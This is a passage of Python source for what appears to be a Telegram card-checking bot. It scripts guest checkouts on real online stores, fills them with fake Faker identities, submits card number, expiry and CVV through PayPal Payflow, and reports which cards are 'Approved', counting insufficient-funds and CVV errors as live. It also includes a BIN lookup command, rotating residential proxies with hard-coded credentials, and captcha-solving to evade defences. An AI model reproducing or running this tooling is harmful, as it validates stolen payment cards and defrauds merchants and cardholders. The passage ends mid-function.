                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'amzn-checkout-session={}; form_key=Fup1oX1F6wztSAgJ; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-banners-cache-storage={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=c5dd03b4f3b0ca3e00956aa0d262df14; form_key=Fup1oX1F6wztSAgJ; wp_ga4_customerGroup=NOT%20LOGGED%20IN; private_content_version=ba6c47db24ba7a50a08953a23d38619d; __wtba=eyJwaSI6eyJuYW1lIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImNvdW50IjoxfSwicyI6W3sicCI6Ii8iLCJldCI6ImhvbWUiLCJ0IjoxNzQ0MDc2MTc5LjMxOH0seyJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsInQiOjE3NDQwNzYyMDUuMjIyfSx7ImUiOiJwcm9kdWN0X2FkZGVkX3RvX2NhcnQiLCJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsImV2IjoiMTIxNTAiLCJ0IjoxNzQ0MDc2MjEwLjQxMzJ9XSwidWkiOnsidCI6MTc0NDA3NjE3OS4zMDksInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidG1wdCI6Ik1TU1hoeGlEQ3FSaklNWThuNUhwMHl2emhhZzRLT3ZQdVhCcUVwaWgifX0=; amzn-checkout-session-config={}; language=en_US; ledgerCurrency=USD; apay-session-set=AI4JUGcUwEs8hLLO0yD7g6vHXVYrf9QC29k44ixZu07vSFdEoMo%2FLzjEXvuU7y0%3D; section_data_ids={%22cart%22:1744076211%2C%22directory-data%22:1744076211%2C%22wp_ga4%22:1744076211%2C%22yotposms-customer-behaviour%22:1744076211}',
            }

            response = self.session.get('https://www.springerpub.com/checkout/', headers=headers)
            r3 = response.text


            entity_id = r3.split('"entity_id":"')[1].split('"')[0]


            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4NzIxNjAiLCJhcCI6IjE1ODkwMTQ2NTUiLCJpZCI6ImRjYmVmZTVjYTRlNGRjYjUiLCJ0ciI6IjRmMmM2YTQ0NzcyYmI2ZDAxMWNmMTNiNDJhZmY0NTJhIiwidGkiOjE3NDQwNzYyMzg5OTR9fQ==',
                'origin': 'https://www.springerpub.com',
                'priority': 'u=1, i',
                'referer': 'https://www.springerpub.com/checkout/',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'traceparent': '00-4f2c6a44772bb6d011cf13b42aff452a-dcbefe5ca4e4dcb5-01',
                'tracestate': '4872160@nr=0-1-4872160-1589014655-dcbefe5ca4e4dcb5----1744076238994',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'x-newrelic-id': 'UA4AU1dVCBABUFhVAQcEVFUD',
                'x-requested-with': 'XMLHttpRequest',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'amzn-checkout-session={}; form_key=Fup1oX1F6wztSAgJ; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-banners-cache-storage={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=c5dd03b4f3b0ca3e00956aa0d262df14; form_key=Fup1oX1F6wztSAgJ; wp_ga4_customerGroup=NOT%20LOGGED%20IN; __wtba=eyJwaSI6eyJuYW1lIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImNvdW50IjoxfSwicyI6W3sicCI6Ii8iLCJldCI6ImhvbWUiLCJ0IjoxNzQ0MDc2MTc5LjMxOH0seyJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsInQiOjE3NDQwNzYyMDUuMjIyfSx7ImUiOiJwcm9kdWN0X2FkZGVkX3RvX2NhcnQiLCJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsImV2IjoiMTIxNTAiLCJ0IjoxNzQ0MDc2MjEwLjQxMzJ9XSwidWkiOnsidCI6MTc0NDA3NjE3OS4zMDksInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidG1wdCI6Ik1TU1hoeGlEQ3FSaklNWThuNUhwMHl2emhhZzRLT3ZQdVhCcUVwaWgifX0=; amzn-checkout-session-config={}; language=en_US; ledgerCurrency=USD; apay-session-set=AI4JUGcUwEs8hLLO0yD7g6vHXVYrf9QC29k44ixZu07vSFdEoMo%2FLzjEXvuU7y0%3D; __stripe_mid=09998030-9f54-417c-9bff-70a3ca15ce01f00b72; __stripe_sid=ea8d9f98-138c-4312-8b31-12988967bca7e28230; section_data_ids={%22cart%22:1744076211%2C%22directory-data%22:1744076211%2C%22wp_ga4%22:1744076211%2C%22yotposms-customer-behaviour%22:1744076211%2C%22messages%22:1744076232}; private_content_version=7051696978a3a7c87d745f56ad5d6d99',
            }

            json_data = {
                'addressInformation': {
                    'shipping_address': {
                        'countryId': 'US',
                        'regionId': '43',
                        'region': '',
                        'street': [
                            'Street 3434',
                        ],
                        'company': '',
                        'telephone': phone,
                        'postcode': '10080',
                        'city': city,
                        'firstname': name,
                        'lastname': last,
                        'customAttributes': [
                            {
                                'attribute_code': 'address_kind',
                                'value': 'Residential',
                            },
                        ],
                    },
                    'billing_address': {
                        'countryId': 'US',
                        'regionId': '43',
                        'region': '',
                        'street': [
                            'Street 3434',
                        ],
                        'company': '',
                        'telephone': phone,
                        'postcode': '10080',
                        'city': city,
                        'firstname': name,
                        'lastname': last,
                        'customAttributes': [
                            {
                                'attribute_code': 'address_kind',
                                'value': 'Residential',
                            },
                        ],
                       'saveInAddressBook': None,
                    },
                    'shipping_method_code': 'matrixrate_1677',
                    'shipping_carrier_code': 'matrixrate',
                    'extension_attributes': {},
                },
            }

            response = self.session.post(f'https://www.springerpub.com/rest/springerpub_default/V1/guest-carts/{entity_id}/shipping-information', headers=headers, json=json_data)
            r4 = response.text




            one = self.cc[0:1]
            if one == "4":
                    cc_type = "VI"
            elif one == "5":
                    cc_type = "MC"
            elif one == "3":
                    cc_type = "Ax"
            elif one == "6":
                    cc_type = "DC"

            mes = int(self.mes)
            last4 = self.cc[4:]

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4NzIxNjAiLCJhcCI6IjE1ODkwMTQ2NTUiLCJpZCI6ImY2MWUxM2FiYmU0NDU5NjkiLCJ0ciI6IjFjM2FjNGVlZWI4MWI0YWViOGJlYzZiOGM1NmIzYjI1IiwidGkiOjE3NDQwNzYyODEwNjV9fQ==',
                'origin': 'https://www.springerpub.com',
                'priority': 'u=1, i',
                'referer': 'https://www.springerpub.com/checkout/',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'traceparent': '00-1c3ac4eeeb81b4aeb8bec6b8c56b3b25-f61e13abbe445969-01',
                'tracestate': '4872160@nr=0-1-4872160-1589014655-f61e13abbe445969----1744076281065',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'x-newrelic-id': 'UA4AU1dVCBABUFhVAQcEVFUD',
                'x-requested-with': 'XMLHttpRequest',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'amzn-checkout-session={}; form_key=Fup1oX1F6wztSAgJ; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-banners-cache-storage={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=c5dd03b4f3b0ca3e00956aa0d262df14; form_key=Fup1oX1F6wztSAgJ; wp_ga4_customerGroup=NOT%20LOGGED%20IN; __wtba=eyJwaSI6eyJuYW1lIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImNvdW50IjoxfSwicyI6W3sicCI6Ii8iLCJldCI6ImhvbWUiLCJ0IjoxNzQ0MDc2MTc5LjMxOH0seyJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsInQiOjE3NDQwNzYyMDUuMjIyfSx7ImUiOiJwcm9kdWN0X2FkZGVkX3RvX2NhcnQiLCJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsImV2IjoiMTIxNTAiLCJ0IjoxNzQ0MDc2MjEwLjQxMzJ9XSwidWkiOnsidCI6MTc0NDA3NjE3OS4zMDksInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidG1wdCI6Ik1TU1hoeGlEQ3FSaklNWThuNUhwMHl2emhhZzRLT3ZQdVhCcUVwaWgifX0=; amzn-checkout-session-config={}; language=en_US; ledgerCurrency=USD; apay-session-set=AI4JUGcUwEs8hLLO0yD7g6vHXVYrf9QC29k44ixZu07vSFdEoMo%2FLzjEXvuU7y0%3D; __stripe_mid=09998030-9f54-417c-9bff-70a3ca15ce01f00b72; __stripe_sid=ea8d9f98-138c-4312-8b31-12988967bca7e28230; private_content_version=6469983823140c78edbcc5b22de74cd2; section_data_ids={%22cart%22:1744076211%2C%22directory-data%22:1744076211%2C%22wp_ga4%22:1744076241%2C%22yotposms-customer-behaviour%22:1744076211%2C%22messages%22:1744076245}',
            }

            json_data = {
                'cartId': entity_id,
                'paymentMethod': {
                    'method': 'payflowpro',
                    'additional_data': {
                        'cc_type': cc_type,
                        'cc_exp_year': self.ano,
                        'cc_exp_month': self.mes,
                        'cc_last_4': last4,
                        'cc_num': self.cc,
                        'cc_cvc': self.cvv,
                    },
                    'extension_attributes': {},
                },
                'email': self.email,
                'billingAddress': {
                    'countryId': 'US',
                    'regionId': '43',
                    'region': '',
                    'street': [
                        'Street 3434',
                    ],
                    'company': '',
                    'telephone': phone,
                    'postcode': '10080',
                    'city': city,
                    'firstname': name,
                    'lastname': last,
                    'customAttributes': [
                        {
                            'attribute_code': 'address_kind',
                            'value': 'Residential',
                        },
                    ],
                    'saveInAddressBook': None,
                },
            }
            response = self.session.post(f'https://www.springerpub.com/rest/springerpub_default/V1/guest-carts/{entity_id}/set-payment-information', headers=headers, json=data)
            r5 = response.text



            
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4NzIxNjAiLCJhcCI6IjE1ODkwMTQ2NTUiLCJpZCI6Ijg1ZjMyNjIzYjU3MjM1MTYiLCJ0ciI6IjA4ODE0ZDU2ODJjZDZlNDNkYzdmYzZkOTExZGU3OWYyIiwidGkiOjE3NDQwNzYyODE5Mjd9fQ==',
                'origin': 'https://www.springerpub.com',
                'priority': 'u=1, i',
                'referer': 'https://www.springerpub.com/checkout/',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'traceparent': '00-08814d5682cd6e43dc7fc6d911de79f2-85f32623b5723516-01',
                'tracestate': '4872160@nr=0-1-4872160-1589014655-85f32623b5723516----1744076281927',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'x-newrelic-id': 'UA4AU1dVCBABUFhVAQcEVFUD',
                'x-requested-with': 'XMLHttpRequest',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'amzn-checkout-session={}; form_key=Fup1oX1F6wztSAgJ; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-banners-cache-storage={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=c5dd03b4f3b0ca3e00956aa0d262df14; form_key=Fup1oX1F6wztSAgJ; wp_ga4_customerGroup=NOT%20LOGGED%20IN; __wtba=eyJwaSI6eyJuYW1lIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImNvdW50IjoxfSwicyI6W3sicCI6Ii8iLCJldCI6ImhvbWUiLCJ0IjoxNzQ0MDc2MTc5LjMxOH0seyJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsInQiOjE3NDQwNzYyMDUuMjIyfSx7ImUiOiJwcm9kdWN0X2FkZGVkX3RvX2NhcnQiLCJwIjoiL3RoZS1oZWFsdGgtc2VydmljZXMtZXhlY3V0aXZlLWhzZS1xLWEtcmV2aWV3LTk3ODA4MjYxMzUyNTQuaHRtbCIsImV0IjoicHJvZHVjdCIsImVpIjoiOTQ3NSIsImV2IjoiMTIxNTAiLCJ0IjoxNzQ0MDc2MjEwLjQxMzJ9XSwidWkiOnsidCI6MTc0NDA3NjE3OS4zMDksInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidG1wdCI6Ik1TU1hoeGlEQ3FSaklNWThuNUhwMHl2emhhZzRLT3ZQdVhCcUVwaWgifX0=; amzn-checkout-session-config={}; language=en_US; ledgerCurrency=USD; apay-session-set=AI4JUGcUwEs8hLLO0yD7g6vHXVYrf9QC29k44ixZu07vSFdEoMo%2FLzjEXvuU7y0%3D; __stripe_mid=09998030-9f54-417c-9bff-70a3ca15ce01f00b72; __stripe_sid=ea8d9f98-138c-4312-8b31-12988967bca7e28230; private_content_version=6469983823140c78edbcc5b22de74cd2; section_data_ids={%22cart%22:1744076211%2C%22directory-data%22:1744076211%2C%22wp_ga4%22:1744076241%2C%22yotposms-customer-behaviour%22:1744076211%2C%22messages%22:1744077245}',
            }

            data = [
                ('form_key', form_key),
                ('captcha_form_id', 'payment_processing_request'),
                ('payment[method]', 'payflowpro'),
                ('billing-address-same-as-shipping', 'on'),
                ('captcha_form_id', 'co-payment-form'),
                ('billing-address-same-as-shipping', 'on'),
                ('payment[authorization_token]', ''),
                ('controller', 'checkout_flow'),
                ('cc_type', cc_type),
            ]
            
            
            response = self.session.post('https://www.springerpub.com/paypal/transparent/requestSecureToken/', cookies=cookies, headers=headers, data=data)
            r6 = response.text

            
            securetoken = r6.split('"securetoken":"')[1].split('"')[0]
            securetokenid = r6.split('"securetokenid":"')[1].split('"')[0]

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.9',
                'cache-control': 'max-age=0',
                'origin': 'https://www.springerpub.com',
                'priority': 'u=0, i',
                'referer': 'https://www.springerpub.com/',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-storage-access': 'none',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            }

            data = {
                'result': '0',
                'securetoken': securetoken,
                'securetokenid': securetokenid,
                'respmsg': 'Approved',
                'result_code': '0',
                #'csc': '086',
                'expdate': f'{self.mes}{self.ano[2:]}',
                'acct': self.cc,
            }

            response = self.session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
            r7 = response.text

            

            try:
                avs = r7.split('name="AVSDATA" value="')[1].split('"')[0]
            except:
                avs = "XXN"

            cvv2 = "None"

            if any(x in r7.lower() for x in ['approval', 'verified', 'success']):
                res = 'Approved ✅'
                mensaje = 'Approval - Success'
            else:
                try:
                    mensaje = r7.split('input type="hidden" name="RESPTEXT" value="')[1].split('"')[0]
                except:
                    mensaje = r7.split('input type="hidden" name="RESPMSG" value="')[1].split('"')[0]

                try:
                    mensaje2 = r7.split('input type="hidden" name="RESPMSG" value="')[1].split('"')[0]
                except:
                    mensaje2 = ""

                # Evaluar condiciones especiales
                if 'cvv' in mensaje.lower():
                    res = 'Approved ✅'
                elif 'insufficient funds' in mensaje.lower():
                    res = 'Approved ✅'
                elif '10574' in mensaje:
                    res = 'Approved ✅'
                elif 'no reasn to decl' in r7.lower():
                    res = 'Approved ✅'
                    mensaje = 'Verified (85: NO REASN TO DECL)'
                    mensaje2 = 'Under review by Fraud Service'
                else:
                    res = 'Declined ❌'

                # Armar mensaje final bonito
                if mensaje2:
                    mensaje = f"{mensaje} | {mensaje2}"
                else:
                    mensaje = mensaje

            # Aquí puedes formatear para que sea legible en Telegram, por ejemplo:
            mensaje_final = f"𝙀𝙨𝙩𝙖𝙙𝙤: {res}\n𝙈𝙚𝙣𝙨𝙖𝙟𝙚: {mensaje}\n𝘼𝙑𝙎: {avs}\n𝘾𝙑𝙑: {cvv2}"

            print(mensaje_final)
            return mensaje_final


            

        except Exception as e:
            linea = str(e.__traceback__.tb_lineno)
            print("Error en PayflowB3_Charged, la linea: " + linea + " | " + str(e))
            res = "Error ⚠️"
            traceback_str = traceback.format_exc()
            mensaje = f"{e} | {traceback_str}"
            avs = "None"
            cvv2 = "None"
            return res, mensaje, avs, cvv2



import aiohttp
from telegram import Update
from telegram.ext import CallbackContext
async def bin(update: Update, context: CallbackContext) -> None:
    # Verificar si se proporcionó un argumento en el comando
    if context.args:
        bin_number = context.args[0]  # Ejemplo: "426807"
        if not bin_number.isdigit() or len(bin_number) < 6:
            await update.message.reply_text("❌ Por favor, proporciona un BIN válido de al menos 6 dígitos. Ejemplo: /bin 426807")
            return
    else:
        await update.message.reply_text("❌ Por favor, proporciona un BIN para buscar. Ejemplo: /bin 426807")
        return

    # Enviar un mensaje inicial mientras se procesa la búsqueda
    processing_message = await update.message.reply_text("🔍 Buscando información del BIN...")

    try:
        # Consultar una API de BIN Lookup
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {"Accept-Version": "3"}  # La API requiere esta cabecera

        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()

                    # Construir el mensaje de respuesta con emojis
                    bin_info = (
                        f"🔎 **Información del BIN {bin_number}**\n"
                        f"💳 Esquema/Tarjeta: {data.get('scheme', 'N/A').capitalize()}\n"
                        f"📂 Tipo: {data.get('type', 'N/A').capitalize()}\n"
                        f"🏷️ Marca: {data.get('brand', 'N/A')}\n"
                        f"💵 Prepagada: {'Sí' if data.get('prepaid', False) else 'No'}\n"
                        f"🏦 Banco: {data.get('bank', {}).get('name', 'N/A')}\n"
                        f"🌎 País: {data.get('country', {}).get('name', 'N/A')} ({data.get('country', {}).get('alpha2', 'N/A')})\n"
                        f"💲 Moneda: {data.get('country', {}).get('currency', 'N/A')}\n"
                    )
                    await processing_message.edit_text(bin_info)
                elif response.status == 404:
                    await processing_message.edit_text(f"❌ No se encontró información para el BIN {bin_number}.")
                else:
                    await processing_message.edit_text(f"⚠️ Ocurrió un error al consultar el BIN {bin_number}. Código HTTP: {response.status}")

    except Exception as e:
        await processing_message.edit_text(f"⚠️ Ocurrió un error al procesar la solicitud: {e}")
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


async def comandoccs(card: str) -> str:
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4 and ano_number.startswith("20"):
                ano_number = ano_number[2:]
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'www.ticktime.store',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'client_id=1743051704668442; _c_id=1743051704668147383; store_locale=en-US; _gcl_au=1.1.74280633.1743051705; _identity_cart=8cfba914-c1b5-4313-83bf-0352b9263016; _mtid=14alvimb301; _identity_popups_bundle=35bcc351-fb8c-4624-964a-e0b89a7975231743051708; _identity_popups=c1a7ac44-d8d5-4ec1-bb72-af9ecade9fcf1743051708; awesomefrontcookie=4e76a35738f1a3f843a97de04e6ff4cb; __stripe_mid=080944e0-4417-4aed-a304-6c93359c7b8ad2ad80; awesomeab=gd25269-panther-v25s16s0; __cf_bm=W5ebQzz8vOV6JZAC3afOpu_mlcN0F6dsW.zZGi4i17w-1744317015-1.0.1.1-4YQdeTtVOSZtY6YHUZYwa6jKvtneXT85rHjsFPWTpUx3HEhFJ69lAzKSPGoQCx50JY5EmnSgMUKWwHkHYtbiKIj0aVVLnj1xp3gy6vM2z50; _cfuvid=18YWRSV0uQAdMKWg3KLUEry7yCOnPHNNbert7GZYliM-1744317015315-0.0.1.1-604800000; sw_session=67f82a88bd177; ss_id_a_p=1744317065782392; session_id=1744317065782392; last_land_url=https%3A%2F%2Fwww.ticktime.store%2F; last_template_name=index; _gid=GA1.2.2111401025.1744317067; checkout_locale=es-ES; googtrans=/auto/es; googtrans=/auto/es; checkout_token=%7B%22keys%22%3A%5B%7B%22source_id%22%3A%2288497-TK200006428%22%2C%22checkout_token%22%3A%22e6e8f6e902e5287620dab30d0dfb40%22%2C%22updated_at%22%3A%221744317129%22%7D%5D%7D; __stripe_sid=2added29-6958-4567-99fd-43d4e63ab9c55fdd03; _gat_gtag_UA_185103810_1=1; page_render_time=209; page_time=230; _ga=GA1.2.2113997164.1743051705; _ga_FLQ5SBQQTX=GS1.1.1744317066.3.1.1744317330.29.0.0; gate_time=28',
                'origin': 'https://www.ticktime.store',
                'pragma': 'no-cache',
                'referer': 'https://www.ticktime.store/collections/featured-by-ticktime/products/ticktime-earphones-ear2',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'product_id': '7b940e50-41a7-445a-a226-f2cfdf76cd6b',
